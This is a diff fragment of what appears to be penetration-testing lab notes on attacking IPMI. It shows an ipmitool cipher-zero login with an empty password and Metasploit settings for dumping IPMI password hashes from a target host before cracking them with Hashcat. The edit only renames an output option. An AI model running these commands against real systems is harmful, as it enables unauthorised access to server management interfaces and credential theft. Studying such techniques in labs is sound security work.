@@ -50,7 +50,7 @@ ipmitool -I lanplus -C 0 -H 10.129.2.15 -U admin -P "" user list
 # Dumps hashes for default users (admin, root, etc.)
 use auxiliary/scanner/ipmi/ipmi_dumphashes
 set RHOSTS 10.129.2.15
-set OUTPUT_FILE ipmi_hashes.txt
+set OUTPUT_HASHCAT_FILE ipmi_hashes.txt
 run
 ```
 ### Crack Hashes (Hashcat)
